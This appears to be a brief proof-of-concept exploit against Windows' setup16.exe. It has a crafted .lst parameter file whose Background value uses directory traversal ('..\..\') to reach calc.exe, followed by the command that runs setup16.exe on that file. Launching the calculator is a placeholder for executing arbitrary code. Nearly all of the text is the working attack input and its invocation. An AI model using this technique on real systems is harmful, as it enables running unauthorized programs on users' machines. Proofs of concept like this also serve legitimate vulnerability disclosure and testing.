test1.lst:
```
[Params]
TmpDirName = foo
TmpDirSize = 10000
FirstCabNum = 1
LastCabNum = 1
DrvWinClass = foo
CmdLine = foo
WndTitle = foo
WndMess = foo
CabinetFile = foo
InsertCDMsg = foo
InsertDiskMsg = foo
Background = ..\..\..\..\..\..\windows\system32\calc.exe
```

C:\Windows\SysWOW64\setup16.exe -m ./test1.lst -QT
